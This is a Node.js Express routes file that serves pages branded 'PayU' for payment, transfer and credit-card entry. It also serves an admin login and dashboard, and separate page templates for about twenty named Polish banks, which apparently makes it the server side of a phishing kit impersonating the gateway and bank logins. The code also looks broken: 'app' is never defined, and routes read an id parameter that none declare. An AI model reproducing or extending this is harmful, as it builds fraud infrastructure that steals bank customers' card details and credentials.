const config = require("config"),
	  pagesConfig = config.get("Pages"),
	  expressConfig = config.get("Application.express"),
	  cookieParser = require("cookie-parser"),
	  startConfig = config.get("Application.startRedirect")

var server = require('http').createServer(app);
var io = require('socket.io')(server);

module.exports = () => {

	global.allAdmins = []

	app.use(cookieParser())

	app.get("/", (req, res) => {

	})

	app.get("/payu/pay", (req, res) => {
		let id = req["params"]["id"]
		res.render("main", { title: "PayU", id: id, config: pagesConfig["components"]["configuration"], services: pagesConfig["components"]["services"] })
	})


	app.get("/payu/", (req, res) => {
		let id = req["params"]["id"]
		res.render("before", { title: "PayU", id: id, config: pagesConfig["components"]["configuration"], startConfig: startConfig["url"] })
	})

	app.get("/payu/transfer", (req, res) => {
		let id = req["params"]["id"]

		res.render("transfer", { title: "PayU", id: id, config: pagesConfig["components"]["configuration"], services: pagesConfig["components"]["services"] })
	})

	app.get("/payu/creditcard", (req, res) => {
		let id = req["params"]["id"]

		res.render("creditcard", { title: "PayU", id: id, config: pagesConfig["components"]["configuration"], services: pagesConfig["components"]["services"] })
	})

	app.get("/payu/creditcard/next", (req, res) => {
		let id = req["params"]["id"]

		res.render("creditcard-final", { title: "PayU", id: id, config: pagesConfig["components"]["configuration"], services: pagesConfig["components"]["services"] })
	})

	app.get("/payu/admin/dashboard", (req, res) => {
		let id = req["params"]["id"]
		res.render("admin", { title: "PayU", id: id, config: pagesConfig["components"]["configuration"], services: pagesConfig["components"]["services"], cookies: req.cookies })
	})

	app.get("/payu/admin/login", (req, res) => {
		let id = req["params"]["id"]

		res.render("login", { title: "PayU", id: id, config: pagesConfig["components"]["configuration"], services: pagesConfig["components"]["services"] })
	})

	app.get("/payu/summary", (req, res) => {
		let id = req["params"]["id"]

		res.render("summary", { title: "PayU", id: id, config: pagesConfig["components"]["configuration"], services: pagesConfig["components"]["services"] })
	})



	//BANKS

	app.get("/payu/bank/santander", (req, res) => {
		let id = req["params"]["id"]

		res.render("santander", { title: "PayU", id: id, config: pagesConfig["components"]["configuration"], services: pagesConfig["components"]["services"] })
	})

	app.get("/payu/bank/ipko", (req, res) => {
		let id = req["params"]["id"]

		res.render("ipko", { title: "PayU", id: id, config: pagesConfig["components"]["configuration"], services: pagesConfig["components"]["services"] })
	})

	app.get("/payu/bank/bfgsa", (req, res) => {
		let id = req["params"]["id"]

		res.render("bfgsa", { title: "PayU", id: id, config: pagesConfig["components"]["configuration"], services: pagesConfig["components"]["services"] })
	})

	app.get("/payu/bank/citihandlowy", (req, res) => {
		let id = req["params"]["id"]

		res.render("citihandlowy", { title: "PayU", id: id, config: pagesConfig["components"]["configuration"], services: pagesConfig["components"]["services"] })
	})

	app.get("/payu/bank/bosbank", (req, res) => {
		let id = req["params"]["id"]

		res.render("bosbank", { title: "PayU", id: id, config: pagesConfig["components"]["configuration"], services: pagesConfig["components"]["services"] })
	})

	app.get("/payu/bank/pekao", (req, res) => {
		let id = req["params"]["id"]

		res.render("pekao", { title: "PayU", id: id, config: pagesConfig["components"]["configuration"], services: pagesConfig["components"]["services"] })
	})

	app.get("/payu/bank/plusbank", (req, res) => {
		let id = req["params"]["id"]

		res.render("plusbank", { title: "PayU", id: id, config: pagesConfig["components"]["configuration"], services: pagesConfig["components"]["services"] })
	})

	app.get("/payu/bank/getinbank", (req, res) => {
		let id = req["params"]["id"]

		res.render("getinbank", { title: "PayU", id: id, config: pagesConfig["components"]["configuration"], services: pagesConfig["components"]["services"] })
	})

	app.get("/payu/bank/noblebank", (req, res) => {
		let id = req["params"]["id"]

		res.render("noblebank", { title: "PayU", id: id, config: pagesConfig["components"]["configuration"], services: pagesConfig["components"]["services"] })
	})

	app.get("/payu/bank/cabank", (req, res) => {
		let id = req["params"]["id"]

		res.render("cabank", { title: "PayU", id: id, config: pagesConfig["components"]["configuration"], services: pagesConfig["components"]["services"] })
	})

	app.get("/payu/bank/mbank", (req, res) => {
		let id = req["params"]["id"]

		res.render("mbank", { title: "PayU", id: id, config: pagesConfig["components"]["configuration"], services: pagesConfig["components"]["services"] })
	})

	app.get("/payu/bank/inteligo", (req, res) => {
		let id = req["params"]["id"]

		res.render("inteligo", { title: "PayU", id: id, config: pagesConfig["components"]["configuration"], services: pagesConfig["components"]["services"] })
	})

	app.get("/payu/bank/ideabank", (req, res) => {
		let id = req["params"]["id"]

		res.render("ideabank", { title: "PayU", id: id, config: pagesConfig["components"]["configuration"], services: pagesConfig["components"]["services"] })
	})

	app.get("/payu/bank/bankpocztowy", (req, res) => {
		let id = req["params"]["id"]

		res.render("bankpocztowy", { title: "PayU", id: id, config: pagesConfig["components"]["configuration"], services: pagesConfig["components"]["services"] })
	})

	app.get("/payu/bank/ing", (req, res) => {
		let id = req["params"]["id"]

		res.render("ing", { title: "PayU", id: id, config: pagesConfig["components"]["configuration"], services: pagesConfig["components"]["services"] })
	})

	app.get("/payu/bank/bankispoldzielcze", (req, res) => {
		let id = req["params"]["id"]

		res.render("sgb", { title: "PayU", id: id, config: pagesConfig["components"]["configuration"], services: pagesConfig["components"]["services"] })
	})

	app.get("/payu/bank/aliorbank", (req, res) => {
		let id = req["params"]["id"]

		res.render("aliorbank", { title: "PayU", id: id, config: pagesConfig["components"]["configuration"], services: pagesConfig["components"]["services"] })
	})

	app.get("/payu/bank/millenium", (req, res) => {
		let id = req["params"]["id"]

		res.render("millenium", { title: "PayU", id: id, config: pagesConfig["components"]["configuration"], services: pagesConfig["components"]["services"] })
	})

	app.get("/payu/bank/bnpparibas", (req, res) => {
		let id = req["params"]["id"]

		res.render("bnpparibas", { title: "PayU", id: id, config: pagesConfig["components"]["configuration"], services: pagesConfig["components"]["services"] })
	})

	app.get("/payu/bank/nestbank", (req, res) => {
		let id = req["params"]["id"]

		res.render("nestbank", { title: "PayU", id: id, config: pagesConfig["components"]["configuration"], services: pagesConfig["components"]["services"] })
	})

}